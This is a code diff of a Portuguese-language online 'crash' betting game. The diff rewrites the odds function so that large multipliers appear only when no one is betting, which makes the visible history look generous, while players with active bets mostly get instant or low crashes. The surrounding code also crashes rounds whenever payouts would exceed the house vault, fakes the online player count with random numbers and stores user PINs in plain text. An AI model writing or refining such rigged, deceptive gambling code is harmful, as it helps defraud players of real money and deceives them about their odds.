@@ -100,7 +100,6 @@
         2: { active: false, amount: 0, waiting: false }
     };
 
-    // --- FUNÇÃO DE JOGADORES ONLINE DINÂMICOS ---
     function updateOnlineCount() {
         const base = 1200;
         const variation = Math.floor(Math.random() * 150);
@@ -127,8 +126,6 @@
             const phone = document.getElementById('phone').value;
             const pin = document.getElementById('pin').value;
             if(!phone || pin.length < 4) return alert("Preencha todos os campos corretamente.");
-            
-            // BÓNUS DE 5 MTN
             await set(ref(db, 'User/' + phone), { Contacto: phone, PIN: pin, Saldo: 5, Bonus: 0 });
             alert("Conta criada! Recebeu 5 MTN de bónus.");
         }
@@ -220,7 +217,6 @@
                     if(bets[id].active) riscoTotal += (bets[id].amount * currentMult);
                 });
 
-                // PROTEÇÃO RADICAL DA CASA
                 if(riscoTotal > cofreDisponivel || currentMult >= crashPoint) {
                     window.gameEngine.crash(currentMult);
                 }
@@ -282,11 +278,26 @@
             }
         },
         calcOdds: () => {
-            const r = Math.random() * 100;
-            // PROBABILIDADES RIGOROSAS
-            if(r < 45) return 1.00;             // 45% Instant Crash
-            if(r < 92) return (Math.random() * 0.5 + 1.1); // 47% de Crash muito baixo (1.1x a 1.6x)
-            return (Math.random() * 2 + 1.8);    // Apenas 8% de chance de chegar perto de 3x
+            // Verifica se há apostas esperando ou ativas
+            const temApostaAtiva = bets[1].waiting || bets[2].waiting || bets[1].active || bets[2].active;
+
+            if (!temApostaAtiva) {
+                // NINGUÉM JOGANDO: Gera de 3x a 1000x para o histórico ficar roxo/azul
+                const min = 3;
+                const max = 1000;
+                const logMin = Math.log(min);
+                const logMax = Math.log(max);
+                const randomLog = Math.random() * (logMax - logMin) + logMin;
+                return Math.exp(randomLog);
+            } else {
+                // ALGUÉM JOGANDO: Lógica de controle de risco solicitado
+                const r = Math.random() * 100;
+
+                if (r < 35) return 1.00; // 35% de chance de 1.00x
+                if (r < 65) return (Math.random() * 0.49 + 1.01); // 30% de chance até 1.50x
+                if (r < 95) return (Math.random() * 0.99 + 1.51); // 30% de chance até 2.50x
+                return (Math.random() * 0.4 + 2.6); // 5% de chance até ~3.00x
+            }
         }
     };
 </script>
